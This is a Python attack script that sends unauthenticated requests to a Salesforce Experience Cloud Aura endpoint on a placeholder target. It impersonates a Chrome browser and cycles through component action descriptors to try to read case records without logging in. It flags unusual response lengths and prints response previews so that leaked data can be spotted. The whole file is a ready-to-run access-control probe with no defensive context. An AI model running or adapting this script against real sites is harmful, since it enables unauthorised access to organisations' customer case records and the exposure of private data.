import json
from curl_cffi import requests

session = requests.Session()
gateway_url = "https://yourtarget.com/help/s/sfsites/aura"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "X-SFDC-Aura-Request": "true",
    "X-Requested-With": "XMLHttpRequest"
}

aura_context = json.dumps({
    "mode": "PROD",
    "fwuid": "ZVYtV2g3NHN0UGNVNzBMbldfZ0ZwZ2tVMjdnTGFERUU2S3FfSVdrcU92bkExNS4zLjE2MDEw",
    "app": "siteforce:communityApp",
    "loaded": {"APPLICATION@markup://siteforce:communityApp": "1897_Qx6CsUG7r803A_23Hon_1g"}
})

# Correcting component action descriptors to valid component formats
valid_format_descriptors = [
    "markup://forceCommunity:caseDetail/ACTION$getRecord",
    "markup://c:caseDetailController/ACTION$getCase",
    "aura://forceCommunity:recordViewer/ACTION$getRecordData"
]

test_params = {
    "recordId": "500000000000000AAA"
}

for desc in valid_format_descriptors:
    data = {
        "message": json.dumps({
            "actions": [
                {
                    "id": "11;a",
                    "descriptor": desc,
                    "callingDescriptor": "UNKNOWN",
                    "params": test_params
                }
            ]
        }),
        "aura.context": aura_context,
        "aura.token": "null"
    }

    print(f"[*] Testing formatted descriptor: {desc}...")
    res = session.post(gateway_url, headers=headers, data=data, impersonate="chrome120", timeout=10)
    print(f"    [+] Status: {res.status_code} | Length: {len(res.text)}")
    
    if len(res.text) != 1673 and len(res.text) != 815:
        print(f"    [🔥] UNIQUE RESPONSE LENGTH! Length: {len(res.text)}")
        print(f"    [+] Preview: {res.text[:400]}")
    else:
        print(f"    [-] Standard/handled response length ({len(res.text)} bytes).")

